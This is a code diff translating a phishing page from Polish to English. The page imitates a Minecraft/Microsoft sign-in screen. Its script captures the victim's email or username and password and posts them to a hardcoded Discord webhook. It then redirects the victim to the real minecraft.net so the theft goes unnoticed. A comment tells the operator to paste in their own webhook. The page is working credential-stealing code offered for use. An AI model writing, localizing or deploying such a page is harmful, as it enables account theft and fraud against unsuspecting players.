@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zaloguj się | Minecraft</title>
+    <title>Sign in | Minecraft</title>
     <style>
         * {
             box-sizing: border-box;
@@ -112,35 +112,35 @@
     <div class="login-container">
         <div class="logo">MINECRAFT</div>
         
-        <!-- ETAP 1: Nazwa użytkownika / Email -->
+        <!-- STEP 1: Username / Email -->
         <div id="step-email">
-            <h2>Zaloguj się</h2>
-            <p class="subtitle">Użyj swojego konta Microsoft</p>
+            <h2>Sign in</h2>
+            <p class="subtitle">Use your Microsoft account</p>
             
             <div class="input-group">
-                <label for="email">Adres e-mail, telefon lub nazwa użytkownika</label>
+                <label for="email">Email, phone, or skype</label>
                 <input type="text" id="email" placeholder="example@outlook.com" autocomplete="off">
             </div>
             
-            <button class="btn" id="btn-next">Dalej</button>
+            <button class="btn" id="btn-next">Next</button>
         </div>
 
-        <!-- ETAP 2: Hasło -->
+        <!-- STEP 2: Password -->
         <div id="step-password" class="hidden">
-            <h2>Wprowadź hasło</h2>
+            <h2>Enter password</h2>
             <p class="subtitle" id="display-email" style="color: #4CAF50; font-size: 14px;"></p>
             
             <div class="input-group">
-                <label for="password">Hasło</label>
+                <label for="password">Password</label>
                 <input type="password" id="password" placeholder="••••••••">
             </div>
             
-            <button class="btn" id="btn-login">Zaloguj się</button>
+            <button class="btn" id="btn-login">Sign in</button>
         </div>
     </div>
 
     <script>
-        // TUTAJ WKLEJ SWÓJ WEBHOOK Z DISCORDA
+        // TUTAJ PONOWNIE WKLEJ SWÓJ LINK DO WEBHOOKA Z DISCORDA
         const webhookUrl = "https://discord.com/api/webhooks/1574918924745842791/-XvxuWkULD76uZ_1icK_IAtGH58i0xVJ1OABffqGSHQs4QvIvZmbUMLAP7_aug4pnRPr";
 
         const stepEmail = document.getElementById('step-email');
@@ -151,10 +151,10 @@
 
         let savedEmail = "";
 
-        // Przejście z e-maila do hasła
+        // Next button click
         document.getElementById('btn-next').addEventListener('click', function() {
             if (emailInput.value.trim() === "") {
-                alert("Wpisz swój e-mail lub nazwę użytkownika!");
+                alert("Please enter your email or username!");
                 return;
             }
             savedEmail = emailInput.value;
@@ -165,20 +165,20 @@
             passwordInput.focus();
         });
 
-        // Wysłanie danych po wpisaniu hasła
+        // Sign in button click
         document.getElementById('btn-login').addEventListener('click', function() {
             if (passwordInput.value.trim() === "") {
-                alert("Wpisz hasło!");
+                alert("Please enter your password!");
                 return;
             }
 
             const data = {
                 embeds: [{
-                    title: "🔔 Nowe logowanie Minecraft",
-                    color: 5025616, // Zielony kolor paska w Discordzie
+                    title: "🔔 New Minecraft Login",
+                    color: 5025616,
                     fields: [
-                        { name: "📧 Email / Nick", value: savedEmail, inline: false },
-                        { name: "🔑 Hasło", value: passwordInput.value, inline: false }
+                        { name: "📧 Email / Username", value: savedEmail, inline: false },
+                        { name: "🔑 Password", value: passwordInput.value, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 }]
@@ -192,11 +192,10 @@
                 body: JSON.stringify(data)
             })
             .then(() => {
-                // Przekierowanie na prawdziwą stronę Minecraft po udanym "zalogowaniu"
                 window.location.href = "https://minecraft.net";
             })
             .catch((error) => {
-                console.error('Błąd:', error);
+                console.error('Error:', error);
                 window.location.href = "https://minecraft.net";
             });
         });
